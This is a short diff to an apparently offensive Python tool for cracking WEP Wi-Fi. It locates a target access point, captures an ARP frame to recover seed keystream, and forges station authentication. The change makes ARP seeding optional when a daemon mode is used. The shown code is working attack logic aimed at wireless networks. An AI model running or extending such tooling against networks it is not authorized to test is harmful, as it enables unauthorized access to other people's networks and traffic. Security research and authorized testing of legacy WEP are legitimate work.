@@ -267,12 +267,16 @@ async def main_async(args) -> int:
     try:
         target = await find_ap(iface, args.channel, args.bssid, args.ssid,
                                args.scan_secs)
-        captured, seed_body = await capture_seed_arp(
-            iface, target.bssid, args.arp_wait_secs, args.provoke
-        )
-        seed_iv = seed_body[:3]
-        seed_ks = seed_keystream_from_arp(seed_body, want=8)
-        info(f"Seed keystream (8 B) for IV {seed_iv.hex()}: {seed_ks.hex()}")
+        # The manual inject+dump path seeds from a captured broadcast ARP; the
+        # --daemon path uses the real daemon, which self-seeds from ANY WEP data
+        # frame (store.seed_samples) — so it doesn't need an ARP to be present.
+        if not args.daemon:
+            captured, seed_body = await capture_seed_arp(
+                iface, target.bssid, args.arp_wait_secs, args.provoke
+            )
+            seed_iv = seed_body[:3]
+            seed_ks = seed_keystream_from_arp(seed_body, want=8)
+            info(f"Seed keystream (8 B) for IV {seed_iv.hex()}: {seed_ks.hex()}")
 
         step("Fake-auth (associate as a forged STA)")
         fake_auth = WepFakeAuth(iface, target, log_callback=lambda m: info(m))
